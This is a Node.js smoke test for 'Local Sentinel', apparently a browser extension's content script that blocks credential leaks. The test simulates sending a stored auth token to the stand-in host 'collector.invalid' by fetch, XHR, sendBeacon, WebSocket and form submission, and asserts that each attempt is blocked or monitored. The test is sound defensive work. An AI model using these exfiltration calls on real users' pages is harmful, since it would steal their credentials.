'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

class FakeEventTarget {
  constructor() { this.listeners = new Map(); }
  addEventListener(type, listener) {
    const list = this.listeners.get(type) || [];
    list.push(listener); this.listeners.set(type, list);
  }
  dispatchEvent(event) {
    for (const listener of this.listeners.get(event.type) || []) listener.call(this, event);
  }
}

class FakeStorage {
  constructor() { this.data = new Map(); }
  get length() { return this.data.size; }
  key(index) { return Array.from(this.data.keys())[index] ?? null; }
  getItem(key) { return this.data.has(String(key)) ? this.data.get(String(key)) : null; }
  setItem(key, value) { this.data.set(String(key), String(value)); }
  removeItem(key) { this.data.delete(String(key)); }
  clear() { this.data.clear(); }
}

class FakeXhr {
  open() {}
  send() { this.sent = true; }
}

class FakeSocket {
  constructor(url) { this.url = String(url); }
  send(data) { this.data = data; }
}

class FakeForm {
  constructor(action, sensitive = true) { this.action = action; this.sensitive = sensitive; }
  querySelector() { return this.sensitive ? {} : null; }
  submit() { this.submitted = true; }
}

async function run() {
  const window = new FakeEventTarget();
  const location = new URL('https://app.example.com/account');
  let networkCalls = 0;
  Object.assign(window, {
    window,
    self: window,
    top: window,
    location,
    history: { pushState() {}, replaceState() {} },
    Storage: FakeStorage,
    localStorage: new FakeStorage(),
    sessionStorage: new FakeStorage(),
    XMLHttpRequest: FakeXhr,
    WebSocket: FakeSocket,
    HTMLFormElement: FakeForm,
    fetch: async () => { networkCalls += 1; return { ok: true }; }
  });
  const navigator = { sendBeacon() { networkCalls += 1; return true; } };
  window.navigator = navigator;
  window.postMessage = (data) => window.dispatchEvent({ type: 'message', source: window, data });

  const sandbox = {
    window, location, history: window.history, navigator,
    Storage: FakeStorage, XMLHttpRequest: FakeXhr, WebSocket: FakeSocket,
    HTMLFormElement: FakeForm, EventTarget: FakeEventTarget,
    URL, URLSearchParams, FormData, Blob, ArrayBuffer, TextDecoder, DOMException,
    Proxy, Reflect, Object, Set, Map, WeakMap, JSON, String, Number, Boolean,
    Date, Math, RegExp, Promise
  };
  vm.createContext(sandbox);
  const source = fs.readFileSync(path.join(__dirname, '..', 'src', 'content', 'page-probe.js'), 'utf8');
  vm.runInContext(source, sandbox, { filename: 'page-probe.js' });

  const token = 'test-secret-token-123456789';
  window.localStorage.setItem('authToken', token);
  await assert.rejects(
    window.fetch('https://collector.invalid/leak', { method: 'POST', body: JSON.stringify({ token }) }),
    /Local Sentinel blocked/
  );
  assert.equal(networkCalls, 0, 'blocked fetch must not reach the original network function');

  await window.fetch('https://api.example.com/profile', { method: 'POST', body: JSON.stringify({ token }) });
  assert.equal(networkCalls, 1, 'same-site API request should remain compatible in balanced mode');

  const xhr = new window.XMLHttpRequest();
  xhr.open('POST', 'https://collector.invalid/xhr');
  assert.throws(() => xhr.send(token), /possible credential leak/);
  assert.equal(navigator.sendBeacon('https://collector.invalid/beacon', token), false, 'beacon leak must be blocked');
  const socket = new window.WebSocket('wss://collector.invalid/socket');
  assert.throws(() => socket.send(token), /Blocked by Local Sentinel/);

  window.postMessage({ source: 'local_sentinel_guard', type: 'policy', payload: { enabled: true, mode: 'strict' } }, '*');
  await assert.rejects(
    window.fetch('https://api.example.com/profile', { method: 'POST', body: token }),
    /Local Sentinel blocked/
  );

  assert.throws(
    () => new FakeForm('http://collector.invalid/login').submit(),
    /dangerous programmatic form submission/
  );

  window.postMessage({ source: 'local_sentinel_guard', type: 'policy', payload: { enabled: true, mode: 'monitor' } }, '*');
  await window.fetch('https://collector.invalid/leak', { method: 'POST', body: token });
  assert.equal(networkCalls, 2, 'monitor mode must report without blocking');
  console.log('page-probe smoke tests passed');
}

run().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
